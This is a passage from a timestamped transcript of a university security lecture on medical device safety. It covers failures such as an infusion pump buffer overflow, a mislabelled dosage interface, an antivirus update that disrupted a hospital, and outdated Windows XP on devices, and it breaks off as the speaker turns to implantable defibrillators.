              <text_slice>It is a serious risk.</text_slice>
            </slice>
            <slice>
              <time_slice>6:57</time_slice>
              <text_slice>Actually, 1% of implantations
have major complications,</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>and of those,
about 1% are fatal.</text_slice>
            </slice>
            <slice>
              <time_slice>7:03</time_slice>
              <text_slice>So controlling infection is one
of the most important things</text_slice>
            </slice>
            <slice>
              <time_slice>7:06</time_slice>
              <text_slice>you can do in the implantation
and changing of the device.</text_slice>
            </slice>
            <slice>
              <time_slice>7:10</time_slice>
              <text_slice>Of course, if you go the
other extreme and just say,</text_slice>
            </slice>
            <slice>
              <time_slice>7:13</time_slice>
              <text_slice>I want to put
wireless everywhere,</text_slice>
            </slice>
            <slice>
              <time_slice>7:14</time_slice>
              <text_slice>you'll get different
kinds of risks.</text_slice>
            </slice>
            <slice>
              <time_slice>7:16</time_slice>
              <text_slice>So I've sort of dubbed this
the bacon theory of wireless.</text_slice>
            </slice>
            <slice>
              <time_slice>7:21</time_slice>
              <text_slice>Now my mother's
from the Midwest,</text_slice>
            </slice>
            <slice>
              <time_slice>7:23</time_slice>
              <text_slice>so she used to say bacon
makes everything better.</text_slice>
            </slice>
            <slice>
              <time_slice>7:25</time_slice>
              <text_slice>And I've noticed there are
some device manufacturers who</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>seem to be putting wireless
everywhere without necessarily</text_slice>
            </slice>
            <slice>
              <time_slice>7:30</time_slice>
              <text_slice>thinking through all the risks.</text_slice>
            </slice>
            <slice>
              <time_slice>7:31</time_slice>
              <text_slice>It does have its
benefits, but you</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>need to very strategically
think before you add this</text_slice>
            </slice>
            <slice>
              <time_slice>7:36</time_slice>
              <text_slice>to a safety critical device.</text_slice>
            </slice>
            <slice>
              <time_slice>7:37</time_slice>
              <text_slice>What are the security
risks for instance that</text_slice>
            </slice>
            <slice>
              <time_slice>7:39</time_slice>
              <text_slice>are going to be opening up?</text_slice>
            </slice>
            <slice>
              <time_slice>7:41</time_slice>
              <text_slice>Oops, I had one
misplaced slide, but I</text_slice>
            </slice>
            <slice>
              <time_slice>7:43</time_slice>
              <text_slice>guess I'll just say it anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>7:45</time_slice>
              <text_slice>I'm not going to talk a
whole lot about networking,</text_slice>
            </slice>
            <slice>
              <time_slice>7:47</time_slice>
              <text_slice>but I thought this quote was
just too good not to mention.</text_slice>
            </slice>
            <slice>
              <time_slice>7:50</time_slice>
              <text_slice>Does anyone remember the
ship off the coast of Italy?</text_slice>
            </slice>
            <slice>
              <time_slice>7:53</time_slice>
              <text_slice>The captain says,
"These days, everything</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>is much safer, thanks to modern
instruments and the internet."</text_slice>
            </slice>
            <slice>
              <time_slice>7:58</time_slice>
              <text_slice>And there's his ship
that turned over there.</text_slice>
            </slice>
            <slice>
              <time_slice>8:02</time_slice>
              <text_slice>So you add internet
connectivity and wireless</text_slice>
            </slice>
            <slice>
              <time_slice>8:04</time_slice>
              <text_slice>to your medical device, there
are going to be new risks.</text_slice>
            </slice>
            <slice>
              <time_slice>8:07</time_slice>
              <text_slice>And you don't need
to be afraid of them,</text_slice>
            </slice>
            <slice>
              <time_slice>8:08</time_slice>
              <text_slice>but you just need to have
appropriate mitigating</text_slice>
            </slice>
            <slice>
              <time_slice>8:10</time_slice>
              <text_slice>controls.</text_slice>
            </slice>
            <slice>
              <time_slice>8:12</time_slice>
              <text_slice>So I'm flying through this.</text_slice>
            </slice>
            <slice>
              <time_slice>8:13</time_slice>
              <text_slice>But what I want to
give you is paint</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>a picture of what's a typical
day in a medical device,</text_slice>
            </slice>
            <slice>
              <time_slice>8:19</time_slice>
              <text_slice>and how it's used
in clinical care,</text_slice>
            </slice>
            <slice>
              <time_slice>8:22</time_slice>
              <text_slice>and how that might
change your mindset</text_slice>
            </slice>
            <slice>
              <time_slice>8:23</time_slice>
              <text_slice>if you come from a
security background,</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>and how you think about risk.</text_slice>
            </slice>
            <slice>
              <time_slice>8:27</time_slice>
              <text_slice>So first going to
talk about the world</text_slice>
            </slice>
            <slice>
              <time_slice>8:29</time_slice>
              <text_slice>where there aren't real threats,
just unsafe practices and some</text_slice>
            </slice>
            <slice>
              <time_slice>8:34</time_slice>
              <text_slice>carelessness.</text_slice>
            </slice>
            <slice>
              <time_slice>8:35</time_slice>
              <text_slice>So the FDA maintains a database
of near misses, malfunctions,</text_slice>
            </slice>
            <slice>
              <time_slice>8:39</time_slice>
              <text_slice>injuries, and deaths.</text_slice>
            </slice>
            <slice>
              <time_slice>8:40</time_slice>
              <text_slice>This is all public.</text_slice>
            </slice>
            <slice>
              <time_slice>8:41</time_slice>
              <text_slice>You can go look
this up yourself.</text_slice>
            </slice>
            <slice>
              <time_slice>8:42</time_slice>
              <text_slice>It's called MAUDE.</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>And one of the devices was
called this volumetric infusion</text_slice>
            </slice>
            <slice>
              <time_slice>8:47</time_slice>
              <text_slice>pump.</text_slice>
            </slice>
            <slice>
              <time_slice>8:48</time_slice>
              <text_slice>This is a device that
infuses drugs into your body</text_slice>
            </slice>
            <slice>
              <time_slice>8:51</time_slice>
              <text_slice>through an IV mechanically.</text_slice>
            </slice>
            <slice>
              <time_slice>8:53</time_slice>
              <text_slice>And this patient died.</text_slice>
            </slice>
            <slice>
              <time_slice>8:55</time_slice>
              <text_slice>And if you look carefully,
it says one of the causes</text_slice>
            </slice>
            <slice>
              <time_slice>8:59</time_slice>
              <text_slice>was a buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>9:01</time_slice>
              <text_slice>I think you learned
about buffer overflows</text_slice>
            </slice>
            <slice>
              <time_slice>9:03</time_slice>
              <text_slice>in your first lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>9:04</time_slice>
              <text_slice>So they are very real and they
happen and in every sector.</text_slice>
            </slice>
            <slice>
              <time_slice>9:07</time_slice>
              <text_slice>So in this particular case when
the buffer overflow occurred,</text_slice>
            </slice>
            <slice>
              <time_slice>9:11</time_slice>
              <text_slice>it was actually caught in their
error checking in the software,</text_slice>
            </slice>
            <slice>
              <time_slice>9:14</time_slice>
              <text_slice>but the action it took
was to shut the pump down.</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>To bring it down to a safe mode.</text_slice>
            </slice>
            <slice>
              <time_slice>9:19</time_slice>
              <text_slice>What they didn't realize
was that for some patients,</text_slice>
            </slice>
            <slice>
              <time_slice>9:22</time_slice>
              <text_slice>shutting down the pump is
basically a death sentence.</text_slice>
            </slice>
            <slice>
              <time_slice>9:24</time_slice>
              <text_slice>So this patient died
after the increase</text_slice>
            </slice>
            <slice>
              <time_slice>9:28</time_slice>
              <text_slice>in intracranial pressure,
followed by brain death because</text_slice>
            </slice>
            <slice>
              <time_slice>9:32</time_slice>
              <text_slice>of the buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>9:35</time_slice>
              <text_slice>So there's nothing really
complicated here, right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:38</time_slice>
              <text_slice>You all know you don't
want to have buffer</text_slice>
            </slice>
            <slice>
              <time_slice>9:40</time_slice>
              <text_slice>overflows in your software.</text_slice>
            </slice>
            <slice>
              <time_slice>9:41</time_slice>
              <text_slice>There's no adversary
at this point.</text_slice>
            </slice>
            <slice>
              <time_slice>9:43</time_slice>
              <text_slice>So this kind of illustrates
the state of software, at least</text_slice>
            </slice>
            <slice>
              <time_slice>9:47</time_slice>
              <text_slice>for this particular device.</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>It's very challenging.</text_slice>
            </slice>
            <slice>
              <time_slice>9:51</time_slice>
              <text_slice>The other challenging
part that doesn't come up</text_slice>
            </slice>
            <slice>
              <time_slice>9:53</time_slice>
              <text_slice>a whole lot in a security
course is the human side.</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>So there are few
universities that</text_slice>
            </slice>
            <slice>
              <time_slice>9:59</time_slice>
              <text_slice>focus on the human element, but
I think there ought to be more.</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>So I set out on some life
experience of my own.</text_slice>
            </slice>
            <slice>
              <time_slice>10:05</time_slice>
              <text_slice>My wife asked to
remain anonymous,</text_slice>
            </slice>
            <slice>
              <time_slice>10:07</time_slice>
              <text_slice>so she said as long as
I don't reveal her name.</text_slice>
            </slice>
            <slice>
              <time_slice>10:10</time_slice>
              <text_slice>So that's me, that's our
infusion pump in the back,</text_slice>
            </slice>
            <slice>
              <time_slice>10:13</time_slice>
              <text_slice>and that's our baby in there.</text_slice>
            </slice>
            <slice>
              <time_slice>10:15</time_slice>
              <text_slice>And for us luckily the
pump worked just fine.</text_slice>
            </slice>
            <slice>
              <time_slice>10:18</time_slice>
              <text_slice>But pumps are great for
delivering medical care,</text_slice>
            </slice>
            <slice>
              <time_slice>10:23</time_slice>
              <text_slice>but they have resulted in over
500 deaths due to various forms</text_slice>
            </slice>
            <slice>
              <time_slice>10:28</time_slice>
              <text_slice>of malfunctions.</text_slice>
            </slice>
            <slice>
              <time_slice>10:29</time_slice>
              <text_slice>So I'm going to tell you
about one more malfunction.</text_slice>
            </slice>
            <slice>
              <time_slice>10:34</time_slice>
              <text_slice>There's also an
implantable kind of pump.</text_slice>
            </slice>
            <slice>
              <time_slice>10:35</time_slice>
              <text_slice>They're not just
bedside pumps, the kind</text_slice>
            </slice>
            <slice>
              <time_slice>10:37</time_slice>
              <text_slice>you see on daytime
hospital dramas.</text_slice>
            </slice>
            <slice>
              <time_slice>10:41</time_slice>
              <text_slice>But here's an implantable
pump, and it's</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>got this semipermeable
membrane where</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>you can replenish the drugs.</text_slice>
            </slice>
            <slice>
              <time_slice>10:46</time_slice>
              <text_slice>And this is a user interface
that the nurse or the clinician</text_slice>
            </slice>
            <slice>
              <time_slice>10:49</time_slice>
              <text_slice>uses to change the dosage rate.</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>So does anyone see where you
type in the quantity of drug?</text_slice>
            </slice>
            <slice>
              <time_slice>10:58</time_slice>
              <text_slice>You've got to kind
of squint, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:00</time_slice>
              <text_slice>So you squint really closely.</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>And one thing you'll notice
is here by number six</text_slice>
            </slice>
            <slice>
              <time_slice>11:04</time_slice>
              <text_slice>it says we're going to
dose this bolus-- bolus</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>is a quantum of drug-- over
20 minutes and 12 seconds.</text_slice>
            </slice>
            <slice>
              <time_slice>11:11</time_slice>
              <text_slice>We're going to dose
this into the patient.</text_slice>
            </slice>
            <slice>
              <time_slice>11:12</time_slice>
              <text_slice>And this is implanted,
so you don't feel it.</text_slice>
            </slice>
            <slice>
              <time_slice>11:14</time_slice>
              <text_slice>There's no nerve.</text_slice>
            </slice>
            <slice>
              <time_slice>11:16</time_slice>
              <text_slice>And this user
interface is actually</text_slice>
            </slice>
            <slice>
              <time_slice>11:18</time_slice>
              <text_slice>after an FDA recall
went into effect</text_slice>
            </slice>
            <slice>
              <time_slice>11:21</time_slice>
              <text_slice>for the software quality.</text_slice>
            </slice>
            <slice>
              <time_slice>11:23</time_slice>
              <text_slice>So what was missing before the
recall were eight key elements.</text_slice>
            </slice>
            <slice>
              <time_slice>11:28</time_slice>
              <text_slice>In particular HH:MM:SS.</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>So what do you think happens,
or what you think could happen,</text_slice>
            </slice>
            <slice>
              <time_slice>11:38</time_slice>
              <text_slice>if that label were missing?</text_slice>
            </slice>
            <slice>
              <time_slice>11:41</time_slice>
              <text_slice>It's really easy to
get the units wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>Make an order of
magnitude error.</text_slice>
            </slice>
            <slice>
              <time_slice>11:48</time_slice>
              <text_slice>So unfortunately for this
patient, who later expired,</text_slice>
            </slice>
            <slice>
              <time_slice>11:52</time_slice>
              <text_slice>he or she had his or
her pump reprogrammed,</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>and the health care
professional noticed</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>that the bolus was given over
20 minutes instead of 20 hours</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>after the fact.</text_slice>
            </slice>
            <slice>
              <time_slice>12:02</time_slice>
              <text_slice>Unfortunately the patient
left the facility,</text_slice>
            </slice>
            <slice>
              <time_slice>12:05</time_slice>
              <text_slice>got into a motor
vehicle accident,</text_slice>
            </slice>
            <slice>
              <time_slice>12:07</time_slice>
              <text_slice>and then later died after the
family removed life support.</text_slice>
            </slice>
            <slice>
              <time_slice>12:10</time_slice>
              <text_slice>But if you look at this from
a technical perspective,</text_slice>
            </slice>
            <slice>
              <time_slice>12:14</time_slice>
              <text_slice>the problem is
pretty simple, right?</text_slice>
            </slice>
            <slice>
              <time_slice>12:16</time_slice>
              <text_slice>In terms of you didn't
have the label there.</text_slice>
            </slice>
            <slice>
              <time_slice>12:19</time_slice>
              <text_slice>But human factors is
very easy to overlook.</text_slice>
            </slice>
            <slice>
              <time_slice>12:21</time_slice>
              <text_slice>It's not always right
there, front and center,</text_slice>
            </slice>
            <slice>
              <time_slice>12:23</time_slice>
              <text_slice>in the engineering process.</text_slice>
            </slice>
            <slice>
              <time_slice>12:24</time_slice>
              <text_slice>Do you have a human factors
part in this lecture?</text_slice>
            </slice>
            <slice>
              <time_slice>12:26</time_slice>
              <text_slice>See what I mean?</text_slice>
            </slice>
            <slice>
              <time_slice>12:27</time_slice>
              <text_slice>Blame Nickolai.</text_slice>
            </slice>
            <slice>
              <time_slice>12:29</time_slice>
              <text_slice>No, Nickolai is great.</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>But it's a very
important element</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>of improving the
trustworthiness of devices</text_slice>
            </slice>
            <slice>
              <time_slice>12:36</time_slice>
              <text_slice>that rely on software.</text_slice>
            </slice>
            <slice>
              <time_slice>12:38</time_slice>
              <text_slice>So I encourage you to think
about better human elements</text_slice>
            </slice>
            <slice>
              <time_slice>12:41</time_slice>
              <text_slice>and human factors
for your software,</text_slice>
            </slice>
            <slice>
              <time_slice>12:43</time_slice>
              <text_slice>even if it's on
something non-critical.</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>So that should begin
to paint a picture</text_slice>
            </slice>
            <slice>
              <time_slice>12:49</time_slice>
              <text_slice>of the typical problems
in medical device failures</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>post [INAUDIBLE] 25.</text_slice>
            </slice>
            <slice>
              <time_slice>12:55</time_slice>
              <text_slice>And the other thing
I want to talk about</text_slice>
            </slice>
            <slice>
              <time_slice>12:57</time_slice>
              <text_slice>is the exciting
world of management.</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>Management, exciting.</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>I used to collect all these
little dialogue boxes whenever</text_slice>
            </slice>
            <slice>
              <time_slice>13:05</time_slice>
              <text_slice>my computer would get
a software update,</text_slice>
            </slice>
            <slice>
              <time_slice>13:07</time_slice>
              <text_slice>but this all happens
in the background now.</text_slice>
            </slice>
            <slice>
              <time_slice>13:09</time_slice>
              <text_slice>Like my iPhone's
constantly getting updates</text_slice>
            </slice>
            <slice>
              <time_slice>13:11</time_slice>
              <text_slice>and drawing more power.</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>But now it just sort of happens.</text_slice>
            </slice>
            <slice>
              <time_slice>13:15</time_slice>
              <text_slice>But medical devices also
take software updates.</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>They're not really
fundamentally different from</text_slice>
            </slice>
            <slice>
              <time_slice>13:23</time_slice>
              <text_slice>traditional computing devices.</text_slice>
            </slice>
            <slice>
              <time_slice>13:25</time_slice>
              <text_slice>They just happen to control
vital functions of your body.</text_slice>
            </slice>
            <slice>
              <time_slice>13:28</time_slice>
              <text_slice>So there's an interesting case.</text_slice>
            </slice>
            <slice>
              <time_slice>13:30</time_slice>
              <text_slice>It's now been about four years.</text_slice>
            </slice>
            <slice>
              <time_slice>13:31</time_slice>
              <text_slice>So McAfee-- there are a
number of antivirus companies</text_slice>
            </slice>
            <slice>
              <time_slice>13:35</time_slice>
              <text_slice>that produce products
that hospitals use--</text_slice>
            </slice>
            <slice>
              <time_slice>13:37</time_slice>
              <text_slice>and in this particular case,
McAfee had this software</text_slice>
            </slice>
            <slice>
              <time_slice>13:40</time_slice>
              <text_slice>update that actually
misclassified</text_slice>
            </slice>
            <slice>
              <time_slice>13:42</time_slice>
              <text_slice>a critical Windows
DL as malicious,</text_slice>
            </slice>
            <slice>
              <time_slice>13:44</time_slice>
              <text_slice>and then decided to
quarantine the system.</text_slice>
            </slice>
            <slice>
              <time_slice>13:49</time_slice>
              <text_slice>So when it
quarantined, let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>13:56</time_slice>
              <text_slice>[COMPUTER SOUND]</text_slice>
            </slice>
            <slice>
              <time_slice>14:00</time_slice>
              <text_slice>That always happens, right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:01</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>So, ha ha ha.</text_slice>
            </slice>
            <slice>
              <time_slice>14:05</time_slice>
              <text_slice>In this particular
case with McAfee,</text_slice>
            </slice>
            <slice>
              <time_slice>14:08</time_slice>
              <text_slice>when they quarantined
this critical Windows DL</text_slice>
            </slice>
            <slice>
              <time_slice>14:10</time_slice>
              <text_slice>as malicious, the machine
just started rebooting.</text_slice>
            </slice>
            <slice>
              <time_slice>14:14</time_slice>
              <text_slice>Blue Screen of
Death and cycling.</text_slice>
            </slice>
            <slice>
              <time_slice>14:16</time_slice>
              <text_slice>And in Rhode Island,
they basically</text_slice>
            </slice>
            <slice>
              <time_slice>14:17</time_slice>
              <text_slice>stopped admitting
patients at one hospital,</text_slice>
            </slice>
            <slice>
              <time_slice>14:19</time_slice>
              <text_slice>except for severe cases
like gunshot wounds,</text_slice>
            </slice>
            <slice>
              <time_slice>14:22</time_slice>
              <text_slice>because their admission systems
weren't working properly.</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>So clinical care depends heavily
on the function of software,</text_slice>
            </slice>
            <slice>
              <time_slice>14:30</time_slice>
              <text_slice>and we sometimes forget
about the role of security.</text_slice>
            </slice>
            <slice>
              <time_slice>14:34</time_slice>
              <text_slice>On the topic of depending
on other people's software,</text_slice>
            </slice>
            <slice>
              <time_slice>14:38</time_slice>
              <text_slice>Microsoft has one of the largest
footprint of operating systems.</text_slice>
            </slice>
            <slice>
              <time_slice>14:42</time_slice>
              <text_slice>And believe it or not, there
are a lot of medical devices</text_slice>
            </slice>
            <slice>
              <time_slice>14:44</time_slice>
              <text_slice>that run on Windows XP.</text_slice>
            </slice>
            <slice>
              <time_slice>14:46</time_slice>
              <text_slice>Windows XP, in case
you didn't hear,</text_slice>
            </slice>
            <slice>
              <time_slice>14:48</time_slice>
              <text_slice>went out of service
half a year ago.</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>So you should not be
using this, because there</text_slice>
            </slice>
            <slice>
              <time_slice>14:53</time_slice>
              <text_slice>are no more updates, security
updates, function updates.</text_slice>
            </slice>
            <slice>
              <time_slice>14:56</time_slice>
              <text_slice>It's antiquated software.</text_slice>
            </slice>
            <slice>
              <time_slice>14:58</time_slice>
              <text_slice>But there are still medical
devices today being shipped</text_slice>
            </slice>
            <slice>
              <time_slice>15:00</time_slice>
              <text_slice>brand new with Windows XP.</text_slice>
            </slice>
            <slice>
              <time_slice>15:03</time_slice>
              <text_slice>The software life cycles
are a little bit misaligned.</text_slice>
            </slice>
            <slice>
              <time_slice>15:06</time_slice>
              <text_slice>If you're used to downloading
updates for your open source</text_slice>
            </slice>
            <slice>
              <time_slice>15:08</time_slice>
              <text_slice>software on a daily basis, well,
think about medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>15:12</time_slice>
              <text_slice>You might not be able to
get to it, say, for a year.</text_slice>
            </slice>
            <slice>
              <time_slice>15:14</time_slice>
              <text_slice>It might be in the
field for 20 years.</text_slice>
            </slice>
            <slice>
              <time_slice>15:16</time_slice>
              <text_slice>So it's very difficult
to locate software</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>that's appropriate for
a 20-year life cycle.</text_slice>
            </slice>
            <slice>
              <time_slice>15:21</time_slice>
              <text_slice>It's basically flying in space.</text_slice>
            </slice>
            <slice>
              <time_slice>15:24</time_slice>
              <text_slice>So the Food and
Drug Administration</text_slice>
            </slice>
            <slice>
              <time_slice>15:26</time_slice>
              <text_slice>has now released some
guidance-- actually,</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>this was just
exactly a month ago--</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>on what they expect to
see from manufacturers.</text_slice>
            </slice>
            <slice>
              <time_slice>15:39</time_slice>
              <text_slice>Think of it as a design project.</text_slice>
            </slice>
            <slice>
              <time_slice>15:40</time_slice>
              <text_slice>As you're writing down
all the requirements</text_slice>
            </slice>
            <slice>
              <time_slice>15:43</time_slice>
              <text_slice>of your medical device,
they're asking manufacturers</text_slice>
            </slice>
            <slice>
              <time_slice>15:45</time_slice>
              <text_slice>how have they thought through
the security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>15:48</time_slice>
              <text_slice>How have they thought through
all the security risks?</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>How are they mitigating it?</text_slice>
            </slice>
            <slice>
              <time_slice>15:51</time_slice>
              <text_slice>What risks are they
accepting as what</text_slice>
            </slice>
            <slice>
              <time_slice>15:53</time_slice>
              <text_slice>they call residual risk,
things that they don't solve?</text_slice>
            </slice>
            <slice>
              <time_slice>15:56</time_slice>
              <text_slice>But they expect them to least
be aware of all the risks</text_slice>
            </slice>
            <slice>
              <time_slice>15:59</time_slice>
              <text_slice>and ideally mitigate them.</text_slice>
            </slice>
            <slice>
              <time_slice>16:02</time_slice>
              <text_slice>So with the management
of software,</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>when no one person
is accountable,</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>all sorts of crazy
things happen.</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>But there is some
guidance now that's</text_slice>
            </slice>
            <slice>
              <time_slice>16:11</time_slice>
              <text_slice>beginning to emerge to help
the manufacturing community</text_slice>
            </slice>
            <slice>
              <time_slice>16:14</time_slice>
              <text_slice>to better integrate security
into their products.</text_slice>
            </slice>
            <slice>
              <time_slice>16:18</time_slice>
              <text_slice>So I think we're making
some pretty good time.</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>16:22</time_slice>
              <text_slice>So now we're going to be able
to go into the security side.</text_slice>
            </slice>
            <slice>
              <time_slice>16:25</time_slice>
              <text_slice>I wanted to get the
non-security stuff out</text_slice>
            </slice>
            <slice>
              <time_slice>16:26</time_slice>
              <text_slice>of the way for the context.</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>So let's put on our gray
hats and black hats.</text_slice>
            </slice>
            <slice>
              <time_slice>16:33</time_slice>
              <text_slice>Before I begin this,
though, I guess</text_slice>
            </slice>
            <slice>
              <time_slice>16:36</time_slice>
              <text_slice>what I want to say is this
is a very challenging area</text_slice>
            </slice>
            <slice>
              <time_slice>16:39</time_slice>
              <text_slice>to do research, because
there are patients.</text_slice>
            </slice>
            <slice>
              <time_slice>16:42</time_slice>
              <text_slice>And if I were given a medical
device, for instance, today,</text_slice>
            </slice>
            <slice>
              <time_slice>16:48</time_slice>
              <text_slice>I'd still take it even if
the security problems weren't</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>all worked out, because
I know I'm much better</text_slice>
            </slice>
            <slice>
              <time_slice>16:52</time_slice>
              <text_slice>off with that medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>16:54</time_slice>
              <text_slice>But that said, of
course, I'd prefer</text_slice>
            </slice>
            <slice>
              <time_slice>16:56</time_slice>
              <text_slice>to have medical devices
that are more secure.</text_slice>
            </slice>
            <slice>
              <time_slice>16:58</time_slice>
              <text_slice>So there is the emergence of
more and more secure devices,</text_slice>
            </slice>
            <slice>
              <time_slice>17:02</time_slice>
              <text_slice>but today, if you have to choose
between a device and no device,</text_slice>
            </slice>
            <slice>
              <time_slice>17:05</time_slice>
              <text_slice>I'd strongly
recommend taking it,</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>because you're going to be
in a much better position.</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>But that said, let's
take a look now.</text_slice>
            </slice>
            <slice>
              <time_slice>17:12</time_slice>
              <text_slice>If we consider the adversary,
and if the adversary</text_slice>
            </slice>
            <slice>
              <time_slice>17:15</time_slice>
              <text_slice>wants to cause problems
to a medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>17:17</time_slice>
              <text_slice>So who's got the
defibrillator at the moment?</text_slice>
            </slice>
            <slice>
              <time_slice>17:21</time_slice>
              <text_slice>Oh, it's right over here.</text_slice>
            </slice>
            <slice>
              <time_slice>17:22</time_slice>
              <text_slice>Good.</text_slice>
            </slice>
            <slice>
              <time_slice>17:24</time_slice>
              <text_slice>So I'd like to tell you
a little bit about how</text_slice>
            </slice>
            <slice>
              <time_slice>17:26</time_slice>
              <text_slice>these defibrillators
are implanted.</text_slice>
            </slice>
            <slice>
              <time_slice>17:28</time_slice>
              <text_slice>This is a very special device
because, well, number one,</text_slice>
            </slice>
            <slice>
              <time_slice>17:31</time_slice>
              <text_slice>it's implanted, therefore
it's very high risk.</text_slice>
            </slice>
            <slice>
              <time_slice>17:33</time_slice>
              <text_slice>It's life sustaining.</text_slice>
            </slice>
            <slice>
              <time_slice>17:36</time_slice>
              <text_slice>If it's pacing your heart,
for instance, and it fails,</text_slice>
            </slice>
            <slice>
              <time_slice>17:38</time_slice>
              <text_slice>the results can be catastrophic.</text_slice>
            </slice>
            <slice>
              <time_slice>17:40</time_slice>
              <text_slice>So it's very interesting from
an engineering perspective.</text_slice>
            </slice>
            <slice>
              <time_slice>17:42</time_slice>
              <text_slice>It needs to work
24/7 for many years.</text_slice>
            </slice>
            <slice>
              <time_slice>17:45</time_slice>
              <text_slice>So this is a programmer.</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>Not a person, but a device.</text_slice>
            </slice>
            <slice>
              <time_slice>17:49</time_slice>
              <text_slice>It's basically a ruggedized
computer, and attached to it</text_slice>
            </slice>
            <slice>
              <time_slice>17:52</time_slice>
              <text_slice>is a little wand.</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>That's not a mouse.</text_slice>
            </slice>
            <slice>
              <time_slice>17:54</time_slice>
              <text_slice>That's a transmitter/receiver
speaking a proprietary wireless</text_slice>
            </slice>
            <slice>
              <time_slice>18:00</time_slice>
              <text_slice>signal over a licensed spectrum.</text_slice>
            </slice>
            <slice>
              <time_slice>18:02</time_slice>
              <text_slice>We're not talking
802.11, we're talking</text_slice>
            </slice>
            <slice>
              <time_slice>18:04</time_slice>
              <text_slice>specially-licensed
spectrum there.</text_slice>
            </slice>
            <slice>
              <time_slice>18:06</time_slice>
              <text_slice>And what happens is it
takes about 90 minutes.</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>The patient is
awake, just slightly</text_slice>
            </slice>
            <slice>
              <time_slice>18:11</time_slice>
              <text_slice>sedated to remain calm, and
there's a local anesthetic.</text_slice>
            </slice>
            <slice>
              <time_slice>18:14</time_slice>
              <text_slice>A small incision is made
beneath the clavicle.</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>And then the team--
typically it's</text_slice>
            </slice>
            <slice>
              <time_slice>18:19</time_slice>
              <text_slice>a team of about six people--
will weave electrodes</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>through a sacrificed
blood vessel that then</text_slice>
            </slice>
            <slice>
              <time_slice>18:27</time_slice>
              <text_slice>terminates inside the heart.</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>And actually I have
one of them right here.</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>This was not previously used.</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
